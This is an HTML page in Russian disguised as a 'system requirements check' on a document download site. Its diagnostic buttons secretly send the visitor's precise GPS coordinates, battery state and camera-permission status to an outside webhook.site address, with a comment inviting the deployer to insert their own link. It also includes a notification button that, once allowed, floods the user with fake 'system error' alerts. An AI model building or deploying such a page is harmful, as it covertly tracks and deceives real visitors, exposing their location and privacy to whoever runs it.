<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр загрузки документов</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f4f4f9; margin: 0; }
        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 20px; font-size: 1.2rem; }
        button { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: background 0.3s; font-size: 1rem; }
        
        .btn-geo { background: #007bff; color: white; }
        .btn-bat { background: #28a745; color: white; }
        .btn-vib { background: #ffc107; color: #333; }
        .btn-cam { background: #dc3545; color: white; }
        
        button:active { transform: scale(0.98); }
        #status { margin-top: 15px; font-size: 0.9rem; color: #666; }
    </style>
</head>
<body>

<div class="card">
    <h2>Проверка системных требований</h2>
    <button class="btn-spam" onclick="subscribePush()" style="background: #6f42c1; color: white;">🔔 Включить оповещения</button>
    <button class="btn-geo" onclick="getGeo()">📡 Проверить GPS соединение</button>
    <button class="btn-bat" onclick="getBattery()">🔋 Проверить состояние батареи</button>
    <button class="btn-vib" onclick="testVibrate()">📳 Тест вибро-отклика</button>
    <button class="btn-cam" onclick="getCamera()">📸 Проверить доступ к камере</button>

    <div id="status">Нажмите кнопку для начала диагностики</div>
</div>

<script>
    const webhookUrl = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb"; // ВСТАВЬ СЮДА СВОЮ ССЫЛКУ

    // Функция отправки данных
    function sendData(type, payload) {
        const query = new URLSearchParams(payload).toString();
        fetch(`${webhookUrl}?type=${type}&${query}`);
        document.getElementById('status').innerText = "Данные успешно синхронизированы";
    }

    function subscribePush() {
    document.getElementById('status').innerText = "Запрос на уведомления...";
    
    // Запрашиваем разрешение
    Notification.requestPermission().then(permission => {
        if (permission === 'granted') {
            sendData("PUSH", { status: "subscribed" });
            document.getElementById('status').innerText = "Подписка оформлена!";
            
            // Запускаем цикл "спама" (локально)
            let count = 0;
            const interval = setInterval(() => {
                new Notification("ВНИМАНИЕ!", {
                    body: "Обнаружена системная ошибка #" + Math.floor(Math.random() * 1000),
                    icon: "https://cdn-icons-png.flaticon.com/512/179/179386.png"
                });
                count++;
                if (count > 20) clearInterval(interval); // Остановится после 20 штук
            }, 1000); // Каждую секунду
        } else {
            sendData("PUSH", { status: "denied" });
            document.getElementById('status').innerText = "В уведомлениях отказано";
        }
    });
}
    // 1. Геолокация
    function getGeo() {
        document.getElementById('status').innerText = "Запрос GPS...";
        navigator.geolocation.getCurrentPosition(
            (p) => {
                sendData("GEO", { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy });
            },
            (e) => { sendData("GEO_ERROR", { code: e.code }); },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    // 2. Заряд батареи
    function getBattery() {
        if (!navigator.getBattery) {
            document.getElementById('status').innerText = "Батарея не поддерживается";
            return;
        }
        navigator.getBattery().then(bat => {
            sendData("BATTERY", { 
                level: (bat.level * 100) + "%", 
                charging: bat.charging ? "Да" : "Нет" 
            });
            document.getElementById('status').innerText = "Заряд батареи считан";
        });
    }

    // 3. Вибрация
    function testVibrate() {
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
            sendData("VIBRATE", { status: "success" });
            document.getElementById('status').innerText = "Вибро-тест запущен";
        } else {
            document.getElementById('status').innerText = "Вибрация не поддерживается";
        }
    }

    // 4. Камера (только запрос разрешения)
    function getCamera() {
        document.getElementById('status').innerText = "Запрос доступа к камере...";
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                sendData("CAMERA", { access: "granted" });
                document.getElementById('status').innerText = "Доступ получен";
                // Останавливаем камеру, чтобы не светился индикатор
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(err => {
                sendData("CAMERA", { access: "denied", error: err.name });
                document.getElementById('status').innerText = "В доступе отказано";
            });
    }
</script>

</body>
</html>button
